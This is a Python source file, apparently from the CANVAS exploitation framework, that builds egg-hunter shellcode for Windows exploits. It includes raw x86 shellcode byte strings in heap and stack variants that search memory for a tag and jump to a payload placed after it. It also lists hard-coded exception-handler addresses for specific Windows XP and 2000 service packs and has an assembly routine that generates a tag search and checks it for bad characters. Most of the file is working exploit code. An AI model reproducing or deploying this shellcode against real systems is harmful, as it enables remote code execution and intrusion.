#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
setupshellcode.py
"""

from MOSDEF import mosdef

class globalexceptionhandler:
    """
    Stores global exception handlers in a dictionary
    """
    def __init__(self):
        #global exception handler values
        self.GEH={}
        self.GEH["XP SP0"]=0x77ed63b4
        self.GEH["XP Home SP1 English"]=0x77ed63b4
        self.GEH["Win2K SP2 English"]=0x77edf44c
        self.GEH["Win2K SP3 English"]=0x77ee044c

    def get(self,version):
        if self.GEH.has_key(version):
            return self.GEH[version]
        print "Didn't find that version in the global exception handler list..."
        return -1

gehfinder=globalexceptionhandler()


#append 8 bytes of tag after this, and before your 
#actual shellcode and you should be good to go.
#you'll probably want to encode this  as well
#see win32search.c for a demo
#also see the .printer exploit.
searchshellcode=""
#Size in bytes: 127

# heap safe static, needs optimising
searchshellcodeheap ="\x55\x89\xe5\x83\xec\x50\xe8\x00\x00\x00\x00\x5b\x83\xec\x20\x81"
searchshellcodeheap+="\xe4\x00\xff\xff\xff\x8d\x83\x5c\x00\x00\x00\x50\x6a\xff\x64\x89"
searchshellcodeheap+="\x25\x00\x00\x00\x00\x83\xc4\x0c\x64\x89\x25\x04\x00\x00\x00\x83"
searchshellcodeheap+="\xec\x0c\x64\x89\x25\x08\x00\x00\x00\x31\xf6\x8b\x93\x72\x00\x00"
searchshellcodeheap+="\x00\x8b\x8b\x76\x00\x00\x00\x8b\x06\x39\xc1\x75\x09\x8b\x46\x04"
searchshellcodeheap+="\x39\xc2\x75\x02\xeb\x03\x46\xeb\xee\x8d\x46\x08\x31\xf6\x64\x89"
searchshellcodeheap+="\x35\x00\x00\x00\x00\xff\xd0\x8b\x44\x24\x0c\x05\xa0\x00\x00\x00"
searchshellcodeheap+="\x8b\x38\x81\xc7\x00\x10\x00\x00\x89\x38\x31\xc0\xc3"

# this is the old static code, sets esp from pcloc
# this is bunk for heap based bugs ofcourse :>
searchshellcode+="\x55\x89\xe5\x83\xec\x50\xe8\x00"
searchshellcode+="\x00\x00\x00\x5b\x89\xdc\x83\xec"
searchshellcode+="\x20\x81\xe4\x00\xff\xff\xff\x8d"
searchshellcode+="\x83\x5e\x00\x00\x00\x50\x6a\xff"
searchshellcode+="\x64\x89\x25\x00\x00\x00\x00\x83"
searchshellcode+="\xc4\x0c\x64\x89\x25\x04\x00\x00"
searchshellcode+="\x00\x83\xec\x0c\x64\x89\x25\x08"
searchshellcode+="\x00\x00\x00\x31\xf6\x8b\x93\x74"
searchshellcode+="\x00\x00\x00\x8b\x8b\x78\x00\x00"
searchshellcode+="\x00\x8b\x06\x39\xc1\x75\x09\x8b"
searchshellcode+="\x46\x04\x39\xc2\x75\x02\xeb\x03"
searchshellcode+="\x46\xeb\xee\x8d\x46\x08\x31\xf6"
searchshellcode+="\x64\x89\x35\x00\x00\x00\x00\xff"
searchshellcode+="\xd0\x8b\x44\x24\x0c\x05\xa0\x00"
searchshellcode+="\x00\x00\x8b\x38\x81\xc7\x00\x10"
searchshellcode+="\x00\x00\x89\x38\x31\xc0\xc3"


#returns a binary version of the string
def binstring(instring):
    result=""
    #erase all whitespace
    tmp=instring.replace(" ","")
    tmp=tmp.replace("\n","")
    tmp=tmp.replace("\t","")
    if len(tmp) % 2 != 0:
        print "tried to binstring something of illegal length"
        return ""

    while tmp!="":
        two=tmp[:2]
        #account for 0x and \x stuff
        if two!="0x" and two!="\\x":
            result+=chr(int(two,16))
        tmp=tmp[2:]

    return result

def getsearchcode(tag1,tag2):
    return searchshellcode+tag1+tag2

def getheapsearchcode(tag1, tag2):
    return searchshellcodeheap+tag1+tag2

def espsearch(tag1,tag2,direction="forwards"):
    code="""
    mov %esp, %esi
    mov $TAG1,%ecx
    mov $TAG2,%edx

    memcmp:
        //does not fault unless failure!
        mov (%esi),%eax
        cmp %eax,%ecx
        jne myaddaddr
        mov 4(%esi),%eax
        cmp %eax,%edx
        jne myaddaddr
        jmp foundtags
        
    myaddaddr:
        inc %esi //forwards
        jmp memcmp

    foundtags:
        lea 8(%esi),%eax
        jmp %eax
    """
    code=code.replace("TAG1",tag1).replace("TAG2",tag2)
    ret=mosdef.assemble(code,"X86")
    return ret
    
if __name__=="__main__":
    import sys
    sys.path.append(".")
    from exploitutils import *
    ret=espsearch("0x41424344","0x45464748")
    print prettyprint(ret)
    bad=0
    badchars="/\. \r\n"
    for b in badchars:
        if b in ret:
            print "%x in ret"%(ord(b)) 
            bad=1
    if not bad:
        print "Clean with length %d!"%(len(ret))
